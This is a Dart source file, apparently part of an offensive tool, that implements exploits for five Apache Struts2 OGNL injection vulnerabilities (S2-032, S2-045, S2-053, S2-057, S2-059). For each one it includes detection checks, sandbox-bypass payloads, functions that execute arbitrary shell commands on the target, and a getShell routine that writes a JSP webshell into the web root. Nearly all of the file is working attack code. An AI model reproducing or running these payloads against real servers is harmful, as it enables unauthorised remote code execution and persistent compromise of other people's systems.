import 'dart:convert';

import 'package:http/http.dart' as http;

import 'services/exp_result.dart';

enum Struts2VulnType {
  s2032('S2-032 (CVE-2016-3081)', 'DMI 方法 OGNL 注入'),
  s2045('S2-045 (CVE-2017-5638)', 'Content-Type OGNL 注入'),
  s2053('S2-053', 'Freemarker 模板 OGNL 注入'),
  s2057('S2-057 (CVE-2018-11776)', 'Namespace OGNL 注入'),
  s2059('S2-059 (CVE-2019-0230)', '标签属性二次 OGNL 求值');

  const Struts2VulnType(this.label, this.desc);
  final String label;
  final String desc;
}


class Struts2ExpService {
  final Uri baseUri;
  final Duration timeout;

  Struts2ExpService({
    required String url,
    this.timeout = const Duration(seconds: 10),
  }) : baseUri = Uri.parse(url.endsWith('/') ? url : '$url/');

  // S2-045: Content-Type header OGNL
  // 服务器写完 marker 后会直接关闭连接（chunked transfer 未正常结束），
  // http.post() 会因此抛异常。改用 StreamedResponse 逐块读取，
  // 连接中断后仍检查已收到的内容。
  Future<ExpResult> checkS2045() async {
    const marker = '54289';
    final ognl =
        '%{(#nike=\'multipart/form-data\').'
        '(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).'
        '(#_memberAccess?(#_memberAccess=#dm):'
        '((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).'
        '(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).'
        '(#ognlUtil.getExcludedPackageNames().clear()).'
        '(#ognlUtil.getExcludedClasses().clear()).'
        '(#context.setMemberAccess(#dm)))).'
        '(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).'
        '(#ros.write(new java.lang.String("$marker").getBytes())).'
        '(#ros.flush())}.multipart/form-data';
    final client = http.Client();
    try {
      final request = http.Request('POST', baseUri);
      request.headers['Content-Type'] = ognl;
      final streamed = await client.send(request).timeout(timeout);
      final buf = StringBuffer();
      try {
        await for (final chunk in streamed.stream.timeout(timeout)) {
          buf.write(String.fromCharCodes(chunk));
          if (buf.toString().contains(marker)) break;
        }
      } catch (_) {
        // 服务器提前关闭连接属正常现象，检查已收到的内容
      }
      if (buf.toString().contains(marker)) {
        return ExpResult(
          true,
          'S2-045 (CVE-2017-5638)',
          'Content-Type OGNL 注入，响应体含标记值 $marker',
        );
      }
    } catch (_) {
    } finally {
      client.close();
    }
    return ExpResult(false, 'S2-045 (CVE-2017-5638)', '');
  }

  // S2-032: method: 参数 OGNL
  Future<ExpResult> checkS2032() async {
    try {
      final detectUrl =
          '${baseUri}index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3d"54289",%23w.print(%23s),%23w.close(),1?%23xx:%23request.toString&encoding=UTF-8';
      final res = await http.get(Uri.parse(detectUrl)).timeout(timeout);
      if (res.body.contains('54289')) {
        return ExpResult(
          true,
          'S2-032 (CVE-2016-3081)',
          'DMI 方法 OGNL 注入，验证通过',
        );
      }
    } catch (_) {}
    return ExpResult(false, 'S2-032 (CVE-2016-3081)', '');
  }

  // S2-053: Freemarker 二次 OGNL 注入
  // 机制：Freemarker 渲染 ${name} 变量，name 值中的 %{OGNL} 被 Struts2 二次求值
  // 路径：/hello.action（vulhub 环境），payload 末尾必须带换行否则无法触发
  Future<ExpResult> checkS2053({String path = 'hello.action'}) async {
    try {
      final uri = baseUri.resolve(path);
      // payload 末尾必须有换行（vulhub README 特别注明）
      const payload = 'redirectUri=%25%7b233*233%7d\n';
      final res = await http
          .post(
            uri,
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: payload,
          )
          .timeout(timeout);
      if (res.body.contains('54289')) {
        return ExpResult(
          true,
          'S2-053',
          'Freemarker 二次 OGNL 注入，数学运算验证通过 (233*233=54289)',
        );
      }
    } catch (_) {}
    return ExpResult(false, 'S2-053', '');
  }

  // 执行命令 - S2-053
  // 输出反射在响应体 <p>Your url: {output}</p> 中
  Future<String?> execS2053(String cmd, {String path = 'hello.action'}) async {
    try {
      final uri = baseUri.resolve(path);
      final escaped = cmd.replaceAll("'", "\\'").replaceAll('\\', '\\\\');
      final ognl =
          '%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).'
          '(#_memberAccess?(#_memberAccess=#dm):'
          '((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).'
          '(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).'
          '(#ognlUtil.getExcludedPackageNames().clear()).'
          '(#ognlUtil.getExcludedClasses().clear()).'
          '(#context.setMemberAccess(#dm)))).'
          '(#cmd=\'$escaped\').'
          '(#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))).'
          '(#cmds=(#iswin?{\'cmd.exe\',\'/c\',#cmd}:{\'/bin/bash\',\'-c\',#cmd})).'
          '(#p=new java.lang.ProcessBuilder(#cmds)).'
          '(#p.redirectErrorStream(true)).'
          '(#process=#p.start()).'
          '(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}';
      final payload = 'redirectUri=${Uri.encodeComponent(ognl)}\n';
      final res = await http
          .post(
            uri,
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: payload,
          )
          .timeout(timeout);
      // 输出在 <p>Your url: ...</p> 中
      final match = RegExp(
        r'<p>Your url:\s*(.*?)\s*</p>',
        dotAll: true,
      ).firstMatch(res.body);
      if (match != null) {
        final out = match.group(1)?.trim() ?? '';
        return out.isNotEmpty ? out : null;
      }
      return null;
    } catch (_) {
      return null;
    }
  }

  // S2-057: namespace OGNL (需要路径)
  // 漏洞触发时 OGNL 表达式求值结果出现在 Location 响应头，而非响应体
  Future<ExpResult> checkS2057({String path = 'struts2-showcase'}) async {
    try {
      final detectUrl =
          'http://${baseUri.host}:${baseUri.port}/$path/%24%7b233*233%7d/actionChain1.action';
      final request = http.Request('GET', Uri.parse(detectUrl));
      request.followRedirects = false;
      final client = http.Client();
      try {
        final streamed = await client.send(request).timeout(timeout);
        final location = streamed.headers['location'] ?? '';
        if (location.contains('54289')) {
          return ExpResult(
            true,
            'S2-057 (CVE-2018-11776)',
            'Namespace OGNL 注入，数学运算验证通过 (Location: $location)',
          );
        }
      } finally {
        client.close();
      }
    } catch (_) {}
    return ExpResult(false, 'S2-057 (CVE-2018-11776)', '');
  }

  // S2-059: id 字段二次 OGNL 求值
  Future<ExpResult> checkS2059() async {
    try {
      final payload = 'id=%25%7b233*233%7d';
      final res = await http
          .post(
            baseUri,
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: payload,
          )
          .timeout(timeout);
      if (res.body.contains('54289')) {
        return ExpResult(
          true,
          'S2-059 (CVE-2019-0230)',
          '标签属性二次 OGNL 求值，数学运算验证通过',
        );
      }
    } catch (_) {}
    return ExpResult(false, 'S2-059 (CVE-2019-0230)', '');
  }

  Future<ExpResult> checkSingle(
    Struts2VulnType type, {
    String path = 'struts2-showcase',
  }) async {
    switch (type) {
      case Struts2VulnType.s2032:
        return checkS2032();
      case Struts2VulnType.s2045:
        return checkS2045();
      case Struts2VulnType.s2053:
        return checkS2053(path: path);
      case Struts2VulnType.s2057:
        return checkS2057(path: path);
      case Struts2VulnType.s2059:
        return checkS2059();
    }
  }

  // 执行命令 - S2-045
  // 用 Scanner+useDelimiter("\\A") 替代 IOUtils.copy，避免 commons-io 依赖。
  // 结果写入 OutputStream 后服务器提前关闭连接，需 StreamedResponse 处理。
  Future<String?> execS2045(String cmd) async {
    final escaped = cmd.replaceAll('\\', '\\\\').replaceAll("'", "\\'");
    final ognl =
        '%{(#nike=\'multipart/form-data\').'
        '(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).'
        '(#_memberAccess?(#_memberAccess=#dm):'
        '((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).'
        '(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).'
        '(#ognlUtil.getExcludedPackageNames().clear()).'
        '(#ognlUtil.getExcludedClasses().clear()).'
        '(#context.setMemberAccess(#dm)))).'
        '(#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))).'
        '(#cmds=(#iswin?{\'cmd.exe\',\'/c\',\'$escaped\'}:{\'/bin/bash\',\'-c\',\'$escaped\'})).'
        '(#p=new java.lang.ProcessBuilder(#cmds)).'
        '(#p.redirectErrorStream(true)).'
        '(#process=#p.start()).'
        '(#out=new java.util.Scanner(#process.getInputStream()).useDelimiter("\\\\A")).'
        '(#output=(#out.hasNext()?#out.next():"")).'
        '(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).'
        '(#ros.write(#output.getBytes())).'
        '(#ros.flush())}';
    final client = http.Client();
    try {
      final request = http.Request('POST', baseUri);
      request.headers['Content-Type'] = ognl;
      final streamed = await client.send(request).timeout(timeout);
      final buf = StringBuffer();
      try {
        await for (final chunk in streamed.stream.timeout(timeout)) {
          buf.write(String.fromCharCodes(chunk));
        }
      } catch (_) {}
      final body = buf.toString();
      // 若 OGNL 失败，服务器返回正常 HTML 页面；命令输出不含 '<html'
      if (body.isNotEmpty && !body.trimLeft().startsWith('<')) {
        return body;
      }
      return null;
    } catch (_) {
      return null;
    } finally {
      client.close();
    }
  }

  // 执行命令 - S2-032
  Future<String?> execS2032(String cmd) async {
    try {
      final encodedCmd = Uri.encodeComponent(cmd);
      final url =
          '${baseUri}index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=$encodedCmd';
      final res = await http.get(Uri.parse(url)).timeout(timeout);
      return res.body.trim().isNotEmpty ? res.body : null;
    } catch (_) {
      return null;
    }
  }

  // 执行命令 - S2-057
  // S2-057 的 OGNL 在 namespace 解析阶段执行，之后 Struts2 仍会 sendRedirect。
  // 命令输出作为 OGNL 最终求值结果嵌入重定向 Location header 的路径段中，
  // 不会出现在响应体。因此必须禁用重定向跟随，从 Location header 提取输出。
  Future<String?> execS2057(
    String cmd, {
    String path = 'struts2-showcase',
  }) async {
    try {
      // 单引号转义，使命令嵌入 OGNL 字符串字面量
      final escapedCmd = cmd.replaceAll('\\', '\\\\').replaceAll("'", "\\'");
      // 与 vulhub README PoC 完全一致：exec(string) 形式，避免 OGNL 数组语法问题
      final ognl =
          "\${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)"
          ".(#ct=#request['struts.valueStack'].context)"
          ".(#cr=#ct['com.opensymphony.xwork2.ActionContext.container'])"
          ".(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))"
          ".(#ou.getExcludedPackageNames().clear())"
          ".(#ou.getExcludedClasses().clear())"
          ".(#ct.setMemberAccess(#dm))"
          ".(#a=@java.lang.Runtime@getRuntime().exec('$escapedCmd'))"
          ".(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}";
      final encodedOgnl = Uri.encodeComponent(ognl);
      final url =
          'http://${baseUri.host}:${baseUri.port}/$path/$encodedOgnl/actionChain1.action';

      final request = http.Request('GET', Uri.parse(url));
      request.followRedirects = false;
      final client = http.Client();
      try {
        final streamed = await client.send(request).timeout(timeout);
        final location = streamed.headers['location'] ?? '';
        if (location.isEmpty) return null;
        // Location 格式：(http://host:port)?/<path>/<cmd_output>/<chained_action>.action
        // chained action 由 struts 配置决定（如 register2.action），不可硬编码。
        // 提取 /<path>/ 之后、最后一个 / 之前的部分即为命令输出。
        String locPath = location;
        if (locPath.startsWith('http')) {
          locPath = Uri.parse(locPath).path;
        }
        final prefix = '/$path/';
        if (locPath.startsWith(prefix)) {
          final rest = locPath.substring(
            prefix.length,
          ); // <cmd_output>/<action>.action
          final lastSlash = rest.lastIndexOf('/');
          final raw = lastSlash > 0 ? rest.substring(0, lastSlash) : rest;
          return Uri.decodeComponent(raw).trim();
        }
        return location; // 兜底：返回完整值供调试
      } finally {
        client.close();
      }
    } catch (_) {
      return null;
    }
  }

  // 执行命令 - S2-059
  // 注意：
  //   1. new String[]{...} 数组字面量在 Struts2 2.5.16 沙箱中被拦截，必须用 exec(String) 形式
  //   2. exec(String) 按空格拆分，不支持 shell 特殊字符（管道/重定向），仅支持简单命令
  //   3. 输出从 <a id="..."> 属性中提取，readLine() 只返回第一行
  Future<String?> execS2059(String cmd) async {
    final uri = baseUri;
    try {
      final bypass =
          '(#vs=#attr["struts.valueStack"].context)'
          '.(#container=#vs["com.opensymphony.xwork2.ActionContext.container"])'
          '.(#ou=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))'
          '.(#ou.setExcludedClasses(""))'
          '.(#ou.setExcludedPackageNames(""))'
          '.(#vs.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS))';
      final exec =
          '.(#proc=@java.lang.Runtime@getRuntime().exec("${cmd.replaceAll('"', '\\"')}"))'
          '.(new java.io.BufferedReader(new java.io.InputStreamReader(#proc.getInputStream())).readLine())';
      final ognl = '%{$bypass$exec}';
      final res = await http
          .get(uri.replace(queryParameters: {'id': ognl}))
          .timeout(timeout);
      final match = RegExp(
        r'<a id="(.*?)"',
        dotAll: false,
      ).firstMatch(res.body);
      final out = match?.group(1)?.trim() ?? '';
      return out.isNotEmpty ? out : null;
    } catch (_) {
      return null;
    }
  }

  Future<String?> execRce(
    Struts2VulnType type,
    String cmd, {
    String path = 'struts2-showcase',
  }) async {
    switch (type) {
      case Struts2VulnType.s2045:
        return execS2045(cmd);
      case Struts2VulnType.s2032:
        return execS2032(cmd);
      case Struts2VulnType.s2057:
        return execS2057(cmd, path: path);
      case Struts2VulnType.s2053:
        return execS2053(cmd, path: path);
      case Struts2VulnType.s2059:
        return execS2059(cmd);
    }
  }

  // ── GetShell ─────────────────────────────────────────────────────────────

  /// Write JSP shell to webroot via each CVE's OGNL channel.
  /// [shellContent] is the raw JSP text (already password-patched).
  /// Returns the shell URL on success, null on failure.
  Future<String?> getShell(
    Struts2VulnType type,
    String shellContent, {
    String path = 'struts2-showcase',
    void Function(String)? onLog,
  }) async {
    const shellName = 'mAtrix_s.jsp';
    final b64 = base64Encode(utf8.encode(shellContent));
    onLog?.call('[*] 写入 JSP Webshell ($shellName)...');
    try {
      switch (type) {
        case Struts2VulnType.s2045:
          await _writeShell045(b64, shellName);
          break;
        case Struts2VulnType.s2032:
          await _writeShell032(b64, shellName);
          break;
        case Struts2VulnType.s2053:
          await _writeShell053(b64, shellName, path: path);
          break;
        case Struts2VulnType.s2057:
          await _writeShell057(b64, shellName, path: path);
          break;
        case Struts2VulnType.s2059:
          await _writeShell059(b64, shellName);
          break;
      }
    } catch (_) {}
    await Future.delayed(const Duration(milliseconds: 500));
    final shellUrl = '${baseUri}$shellName';
    try {
      final res = await http.get(Uri.parse(shellUrl)).timeout(timeout);
      if (res.statusCode == 200) {
        onLog?.call('[+] Webshell 写入成功: $shellUrl');
        return shellUrl;
      }
      onLog?.call('[!] 写入后 HTTP ${res.statusCode}，shell 可能未写入');
    } catch (e) {
      onLog?.call('[!] 验证异常: $e');
    }
    return null;
  }

  // S2-045: Content-Type OGNL → FileOutputStream
  Future<void> _writeShell045(String b64Shell, String shellName) async {
    final write =
        '(#path=@org.apache.struts2.ServletActionContext@getRequest()'
        '.getSession().getServletContext().getRealPath("/"))'
        '.(#b=@java.util.Base64@getDecoder().decode("$b64Shell"))'
        '.(#fos=new java.io.FileOutputStream(#path+"/$shellName"))'
        '.(#fos.write(#b))'
        '.(#fos.close())';
    final ognl =
        "%{(#nike='multipart/form-data')."
        "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
        "(#_memberAccess?(#_memberAccess=#dm):"
        "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
        "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
        "(#ognlUtil.getExcludedPackageNames().clear())."
        "(#ognlUtil.getExcludedClasses().clear())."
        "(#context.setMemberAccess(#dm))))."
        "$write}.multipart/form-data";
    final client = http.Client();
    try {
      final req = http.Request('POST', baseUri);
      req.headers['Content-Type'] = ognl;
      final streamed = await client.send(req).timeout(timeout);
      await streamed.stream.drain();
    } catch (_) {
    } finally {
      client.close();
    }
  }

  // S2-032: URL method:OGNL → FileOutputStream
  Future<void> _writeShell032(String b64Shell, String shellName) async {
    try {
      // '#' → %23, '=' → %3d, '"' → %22, '+' (concat) → %2b, '[' → %5b, ']' → %5d
      final ognlChain =
          '%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,'
          '%23path%3d@org.apache.struts2.ServletActionContext@getRequest()'
          '.getSession().getServletContext().getRealPath(%22/%22),'
          '%23b%3d@java.util.Base64@getDecoder().decode(%22$b64Shell%22),'
          '%23fos%3dnew+java.io.FileOutputStream(%23path%2b%22$shellName%22),'
          '%23fos.write(%23b),'
          '%23fos.close(),'
          '1%3f%23xx%3a%23request.toString';
      final url = '${baseUri}index.action?method:$ognlChain&encoding=UTF-8';
      await http.get(Uri.parse(url)).timeout(timeout);
    } catch (_) {}
  }

  // S2-053: POST redirectUri Freemarker→OGNL → FileOutputStream
  Future<void> _writeShell053(
    String b64Shell,
    String shellName, {
    String path = 'hello.action',
  }) async {
    try {
      final uri = baseUri.resolve(path);
      final write =
          '(#path=@org.apache.struts2.ServletActionContext@getRequest()'
          '.getSession().getServletContext().getRealPath("/"))'
          '.(#b=@java.util.Base64@getDecoder().decode("$b64Shell"))'
          '.(#fos=new java.io.FileOutputStream(#path+"/$shellName"))'
          '.(#fos.write(#b))'
          '.(#fos.close())';
      final payload = 'redirectUri=${Uri.encodeComponent('%{$write}')}\n';
      await http
          .post(
            uri,
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: payload,
          )
          .timeout(timeout);
    } catch (_) {}
  }

  // S2-057: Namespace OGNL → FileOutputStream
  Future<void> _writeShell057(
    String b64Shell,
    String shellName, {
    String path = 'struts2-showcase',
  }) async {
    try {
      final write =
          '.(#path=@org.apache.struts2.ServletActionContext@getRequest()'
          '.getSession().getServletContext().getRealPath("/"))'
          '.(#b=@java.util.Base64@getDecoder().decode("$b64Shell"))'
          '.(#fos=new java.io.FileOutputStream(#path+"/$shellName"))'
          '.(#fos.write(#b))'
          '.(#fos.close())'
          '."ok"';
      final ognl =
          r'${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)'
          '.(#ct=#request["struts.valueStack"].context)'
          '.(#cr=#ct["com.opensymphony.xwork2.ActionContext.container"])'
          '.(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))'
          '.(#ou.getExcludedPackageNames().clear())'
          '.(#ou.getExcludedClasses().clear())'
          '.(#ct.setMemberAccess(#dm))'
          '$write}';
      final encodedOgnl = Uri.encodeComponent(ognl);
      final url =
          'http://${baseUri.host}:${baseUri.port}/$path/$encodedOgnl/actionChain1.action';
      final req = http.Request('GET', Uri.parse(url));
      req.followRedirects = false;
      final client = http.Client();
      try {
        final streamed = await client.send(req).timeout(timeout);
        await streamed.stream.drain();
      } finally {
        client.close();
      }
    } catch (_) {}
  }

  // S2-059: GET id param with confirmed working bypass → FileOutputStream
  Future<void> _writeShell059(String b64Shell, String shellName) async {
    try {
      final bypass =
          '(#vs=#attr["struts.valueStack"].context)'
          '.(#container=#vs["com.opensymphony.xwork2.ActionContext.container"])'
          '.(#ou=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))'
          '.(#ou.setExcludedClasses(""))'
          '.(#ou.setExcludedPackageNames(""))'
          '.(#vs.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS))';
      final write =
          '.(#path=@org.apache.struts2.ServletActionContext@getRequest()'
          '.getSession().getServletContext().getRealPath("/"))'
          '.(#b=@java.util.Base64@getDecoder().decode("$b64Shell"))'
          '.(#fos=new java.io.FileOutputStream(#path+"/$shellName"))'
          '.(#fos.write(#b))'
          '.(#fos.close())'
          '."ok"';
      final ognl = '%{$bypass$write}';
      await http
          .get(baseUri.replace(queryParameters: {'id': ognl}))
          .timeout(timeout);
    } catch (_) {}
  }
}
